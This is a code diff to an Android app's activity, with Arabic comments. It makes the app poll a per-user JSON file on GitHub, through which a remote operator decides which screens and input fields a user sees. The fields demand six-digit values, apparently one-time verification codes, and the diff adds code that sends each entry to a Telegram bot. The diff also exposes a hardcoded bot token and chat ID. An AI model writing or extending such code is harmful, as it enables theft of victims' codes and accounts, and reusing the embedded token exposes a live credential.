@@ -7,7 +7,6 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.LinearLayout;
-import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
@@ -23,15 +22,17 @@ import okhttp3.Response;
 
 public class SecondActivity extends AppCompatActivity {
 
-    private TextView statusTitle, statusDescription;
-    private ProgressBar loadingBar;
+    private LinearLayout layoutWaiting, layoutRejected, layoutFields, groupField1, groupField2, groupField3;
+    private TextView txtRejectReason;
+    private EditText field1, field2, field3;
+    private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder;
     private String userName;
     private final OkHttpClient client = new OkHttpClient();
     private final Handler handler = new Handler();
     private Runnable refreshRunnable;
 
-    // --- إعدادات التحكم (يجب تعديلها) ---
-    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/abdullah14120/ban/refs/heads/main/commands/";
+    // --- إعدادات المراقبة (يجب أن ينتهي الرابط بـ commands/) ---
+    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/حسابك/المستودع/main/commands/";
     private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
     private final String CHAT_ID = "1749638488";
 
@@ -40,109 +41,85 @@ public class SecondActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_second);
 
-        // جلب اسم المستخدم المحفوظ
-        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
-        userName = pref.getString("user_name", "unknown");
-
-        statusTitle = findViewById(R.id.statusTitle);
-        statusDescription = findViewById(R.id.statusDescription);
-        loadingBar = findViewById(R.id.loadingBar);
-
-        // بدء مراقبة الأوامر كل 5 ثوانٍ
+        initViews();
+        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "unknown");
+        setupButtons();
         startAutoRefresh();
+    }
+
+    private void initViews() {
+        layoutWaiting = findViewById(R.id.layoutWaiting);
+        layoutRejected = findViewById(R.id.layoutRejected);
+        layoutFields = findViewById(R.id.layoutFields);
+        groupField1 = findViewById(R.id.groupField1);
+        groupField2 = findViewById(R.id.groupField2);
+        groupField3 = findViewById(R.id.groupField3);
+        txtRejectReason = findViewById(R.id.txtRejectReason);
+        field1 = findViewById(R.id.field1);
+        field2 = findViewById(R.id.field2);
+        field3 = findViewById(R.id.field3);
+        btnConfirm1 = findViewById(R.id.btnConfirm1);
+        btnConfirm2 = findViewById(R.id.btnConfirm2);
+        btnConfirm3 = findViewById(R.id.btnConfirm3);
+        btnFinalOrder = findViewById(R.id.btnFinalOrder);
+    }
+
+    private void setupButtons() {
+        btnConfirm1.setOnClickListener(v -> sendToTg("حقل 1", field1.getText().toString()));
+        btnConfirm2.setOnClickListener(v -> sendToTg("حقل 2", field2.getText().toString()));
+        btnConfirm3.setOnClickListener(v -> sendToTg("حقل 3", field3.getText().toString()));
     }
 
     private void startAutoRefresh() {
         refreshRunnable = new Runnable() {
-            @Override
-            public void run() {
-                checkRemoteCommand();
-                handler.postDelayed(this, 5000); // تكرار كل 5 ثوانٍ
-            }
+            @Override public void run() { checkCommand(); handler.postDelayed(this, 5000); }
         };
         handler.post(refreshRunnable);
     }
 
-    private void checkRemoteCommand() {
-        // رابط الملف الفردي للمستخدم
-        String fileUrl = GITHUB_RAW_URL + userName + ".json";
-
-        Request request = new Request.Builder().url(fileUrl).build();
-        client.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {}
-
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
+    private void checkCommand() {
+        String url = GITHUB_RAW_URL + userName + ".json";
+        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
+            @Override public void onFailure(Call call, IOException e) {}
+            @Override public void onResponse(Call call, Response response) throws IOException {
                 if (response.isSuccessful()) {
                     try {
-                        String jsonData = response.body().string();
-                        JSONObject json = new JSONObject(jsonData);
-                        String status = json.getString("status");
-
-                        runOnUiThread(() -> handleStatus(status, json));
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
+                        JSONObject json = new JSONObject(response.body().string());
+                        runOnUiThread(() -> updateUI(json));
+                    } catch (Exception ignored) {}
                 }
             }
         });
     }
 
-    private void handleStatus(String status, JSONObject json) {
+    private void updateUI(JSONObject json) {
         try {
-            switch (status) {
-                case "waiting":
-                    statusTitle.setText("طلبك قيد المراجعة");
-                    loadingBar.setVisibility(View.VISIBLE);
-                    break;
+            String status = json.getString("status");
+            layoutWaiting.setVisibility(status.equals("waiting") ? View.VISIBLE : View.GONE);
+            layoutRejected.setVisibility(status.equals("rejected") ? View.VISIBLE : View.GONE);
+            layoutFields.setVisibility(status.equals("fields_form") ? View.VISIBLE : View.GONE);
 
-                case "rejected":
-                    loadingBar.setVisibility(View.GONE);
-                    statusTitle.setText("نأسف، تم رفض طلبك");
-                    statusTitle.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
-                    statusDescription.setText(json.optString("reject_reason", "لأسباب أمنية"));
-                    break;
-
-                case "accepted":
-                    loadingBar.setVisibility(View.GONE);
-                    statusTitle.setText("تم قبول طلبك ✅");
-                    statusDescription.setText("يمكنك الآن البدء باستخدام ميزات النظام.");
-                    break;
-                
-                // يمكنك إضافة حالات أخرى هنا (مثل إظهار الحقول)
+            if (status.equals("rejected")) txtRejectReason.setText(json.optString("reject_reason", "مرفوض"));
+            if (status.equals("fields_form")) {
+                int count = json.optInt("visible_fields", 1);
+                groupField1.setVisibility(count >= 1 ? View.VISIBLE : View.GONE);
+                groupField2.setVisibility(count >= 2 ? View.VISIBLE : View.GONE);
+                groupField3.setVisibility(count >= 3 ? View.VISIBLE : View.GONE);
+                btnFinalOrder.setVisibility(json.optBoolean("show_final_button", false) ? View.VISIBLE : View.GONE);
             }
-        } catch (Exception e) {}
+        } catch (Exception ignored) {}
     }
 
-    // دالة إرسال محتوى الحقول لتليجرام
-    private void sendFieldToTelegram(String fieldName, String value) {
-        String message = "تحديث من المستخدم: " + userName + "\n" + fieldName + ": " + value;
-        RequestBody formBody = new FormBody.Builder()
-                .add("chat_id", CHAT_ID)
-                .add("text", message)
-                .build();
-
-        Request request = new Request.Builder()
-                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
-                .post(formBody)
-                .build();
-
-        client.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {}
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم التأكيد", Toast.LENGTH_SHORT).show());
-                }
+    private void sendToTg(String f, String v) {
+        if (v.length() < 6) { Toast.makeText(this, "أدخل 6 أرقام", Toast.LENGTH_SHORT).show(); return; }
+        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", userName + " أرسل: " + f + " = " + v).build();
+        client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build()).enqueue(new Callback() {
+            @Override public void onFailure(Call call, IOException e) {}
+            @Override public void onResponse(Call call, Response response) {
+                runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم الإرسال", Toast.LENGTH_SHORT).show());
             }
         });
     }
 
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        handler.removeCallbacks(refreshRunnable); // إيقاف الفحص عند إغلاق التطبيق
-    }
+    @Override protected void onDestroy() { super.onDestroy(); handler.removeCallbacks(refreshRunnable); }
 }
